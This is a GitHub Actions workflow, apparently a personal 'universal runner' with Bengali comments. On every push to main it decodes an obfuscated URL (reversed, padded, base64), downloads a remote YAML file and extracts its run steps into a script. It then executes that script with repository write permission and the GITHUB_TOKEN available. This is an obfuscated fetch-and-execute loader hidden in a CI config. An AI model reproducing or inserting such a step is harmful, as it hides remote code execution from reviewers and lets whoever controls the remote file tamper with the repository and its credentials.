# Workflow Path: .github/workflows/universal-runner.yml

name: Tnayem48 Universal Runner

on:
  push:
    branches:
      - main
  workflow_dispatch:

env:
  # Double Protected Base URL (Reversed, Padded and Encoded)
  # Target: https://raw.githubusercontent.com/nayem-48ai/nayem-48ai/refs/heads/tnx_bd/
  TNx_CORE: "WD19mbuVmbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmbu02bj52bj5CbvJHcsV2S"
  FILE_NAME: "build"

jobs:
  execute-logic:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0 
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Setup Environment
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Process Workflow
        run: |
          # ডিকোড লজিক: প্যাডিং রিমুভ (অতিরিক্ত অংশ কাটা) এবং রিভার্স অপারেশন
          TNxBD=$(echo "$TNx_CORE" | cut -c 5- | rev | cut -c 6- | base64 --decode)$FILE_NAME
          
          echo "Syncing with secure engine..."
          curl -sL "$TNxBD" -o remote_wf.yml

          # yq টুল সেটআপ
          sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq && sudo chmod +x /usr/bin/yq

          # স্ক্রিপ্ট জেনারেট করা
          yq e '.jobs.*.steps[].run' remote_wf.yml | sed '/^---$/d' > universal_script.sh
          
          # গিট কনফিগ
          git config --global user.name "github-actions[bot]"
          git config --global user.email "github-actions[bot]@users.noreply.github.com"
          git config --global --add safe.directory "$GITHUB_WORKSPACE"

          # এক্সিকিউট
          chmod +x universal_script.sh
          bash universal_script.sh
